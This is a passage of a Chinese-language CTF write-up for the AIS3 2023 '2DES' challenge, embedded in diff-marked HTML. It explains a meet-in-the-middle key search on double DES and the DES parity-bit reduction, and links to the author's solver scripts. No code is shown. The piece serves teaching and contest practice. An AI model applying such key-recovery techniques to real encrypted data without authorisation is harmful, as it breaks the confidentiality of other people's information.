+<p>首先要先知道 <code>encrypt(hint_pt, key1, iv)</code> 與 <code>decrypt(hint, key2, iv)</code> 會是相等的 –（1）。</p>
+<img src="/ais3-pre-exam-2023-write-up/meet-in-the-middle.svg" style="width: 100%;">
+
+<p>利用這個特性，我們先列舉出所有可能的 <code>middle=encrypt(hint_pt, key1, iv)</code>（透過列舉 <code>key1</code> 來達成），需花費 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1290.1 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> 的時間。</p>
+<p>接著來列舉 <code>decrypt(hint, key2, iv)</code>，由於（1），所以當 <code>key2</code> 是正確的時候，一定可以在 middle 裡面找到  <code>decrypt(hint, key2, iv)</code>，所以那個 middle 所對應到的 <code>key1</code> <code>key2</code> 就很可能是正確的，這步驟最多需列舉 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1290.1 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> 個 <code>key2</code>，每次找尋 <code>middle</code> 若使用的是 Javascript 的 map 或 Python 的 dict 所花的時間在一般情況下會是 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.692ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2074 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="4F" d="M308 428Q289 428 289 438Q289 457 318 508T378 593Q417 638 475 671T599 705Q688 705 732 643T777 483Q777 380 733 285T620 123T464 18T293 -22Q188 -22 123 51T58 245Q58 327 87 403T159 533T249 626T333 685T388 705Q404 705 404 693Q404 674 363 649Q333 632 304 606T239 537T181 429T158 290Q158 179 214 114T364 48Q489 48 583 165T677 438Q677 473 670 505T648 568T601 617T528 636Q518 636 513 635Q486 629 460 600T419 544T392 490Q383 470 372 459Q341 430 308 428Z"></path></g></g><g data-mml-node="mo" transform="translate(796,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(1185,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1685,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，所以此步驟需花費 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1290.1 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> 的時間。</p>
+<p>所以所需花的時間從原本的 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="14.539ex" height="2.09ex" role="img" focusable="false" viewBox="0 -841.7 6426.3 923.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1512.3,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msup" transform="translate(2512.6,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(4080.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(5136.2,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> 變成了 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="14.539ex" height="2.072ex" role="img" focusable="false" viewBox="0 -833.9 6426.3 915.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1512.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="msup" transform="translate(2512.6,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(4080.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(5136.2,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container>，變的看起來可行了。</p>
+<p>不過還有一個問題：存 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1290.1 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> 種可能的 middle 會耗掉太多空間然後噴錯（有人還把這個做成<a href="/ais3-pre-exam-2023-write-up/2des-meme.webp">梗圖</a>）。</p>
+<h6 id="DES-Key-Transformation"><a href="#DES-Key-Transformation" class="headerlink" title="DES Key Transformation"></a>DES Key Transformation</h6><p>DES 在拿到 64 bits 的 key 的時候，會把一些東西丟掉變成 56 bits 的 key，所以實際上需要列舉的 <code>key1</code> <code>key2</code> 其實可以更少。</p>
+<p>DES 的 64 bits 的 key 中，第 8, 16, 24, 32, 40, 48, 56, 64 個 bit 是會被丟掉的，不會影響到加解密，所以需列舉的 <code>key1</code> <code>key2</code> 其實各只有 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.904ex" role="img" focusable="false" viewBox="0 -841.7 1290.1 841.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> 種。</p>
+<p>提供我的 Javascript 及 Python 解，都可在 200 秒內於我的電腦上跑出結果，Javascript 比較快。</p>
+<p><a class="link" target="_blank" rel="noopener" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/crypto/2des/exp/exp.js">Javascript 解 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/crypto/2des/exp/exp.py">Python 解 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
